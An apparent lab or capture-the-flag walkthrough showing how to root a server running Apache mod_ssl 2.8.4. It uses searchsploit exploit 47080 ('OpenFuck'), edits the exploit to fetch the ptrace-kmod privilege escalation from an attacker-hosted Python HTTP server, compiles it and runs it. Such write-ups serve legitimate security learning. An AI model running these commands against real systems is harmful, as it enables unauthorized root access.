
<img width="1103" height="671" alt="image" src="https://github.com/user-attachments/assets/e6d97ba1-e765-40fd-96ab-30a072b25cf4" />

As we can see the server is running apache with mod_ssl 2.8.4. If we search for this with searchsploit we find that there are several available exploits for this verison. Some very old, but one newer.
The newer one is actually one of the older ones that has been made to be compatible to be compiled with more modern systems.

<img width="1850" height="201" alt="image" src="https://github.com/user-attachments/assets/ae04bc8e-bbe6-4bfc-b235-b1efcc0eb575" />

So let's copy the newer version of the source code to our current directory.

```searchsploit -m 47080```

Now that we have the script available to us. Let's make it compatible to be run on a VM that isn't connected to the internet. Since the exploit tries to download the priv esc part from the internet.
Instead, we'll download that part onto our attacking machine and host a python HTTP server that we can download it from, within our LAN.

The priv esc source code can be found here: https://www.exploit-db.com/exploits/3

```wget https://www.exploit-db.com/download/3```

Now that we have it downloaded we need to adjust the code for the exploit to point to our IP instead. So open it with vim and search for "https" and you'll find the part that needs changing.

```vim 47080.c```

<img width="1099" height="574" alt="image" src="https://github.com/user-attachments/assets/92d7f251-cee6-4797-ac71-d238bdc6ed48" />

We'll change this to http://<our-ip>:<our-port>/ptrace-kmod.c (notice the removal of the s in the protocol in the beginning) and we'll change the name of the file we downloaded to ptrace-kmod.c

```mv 3 ptrace-kmod.c```

Now we should be all set to compile the exploit, start our python http server and get root on our target.
Make sure that you have libssl-dev installed to be able to compile it.

```sudo apt install libssl-dev```

```gcc -o openfuck 47080.c -lcrypto```

Don't worry about the warnings during compilation. It should work anyway.

So now we have the exploit compiled, lets start our http server in a new terminal window.

```python3 -m http.server 1338```

<img width="508" height="98" alt="image" src="https://github.com/user-attachments/assets/bc51d0fc-16dc-4bd4-9676-cc80811e4a4d" />

Now then, time to run the exploit.

```./openfuck 0x6b <target-ip> <target-port> -c 40```

<img width="819" height="634" alt="image" src="https://github.com/user-attachments/assets/03fd65f8-60d7-4f3f-a424-cb5102096451" />

And we're root on the server. Awesome!
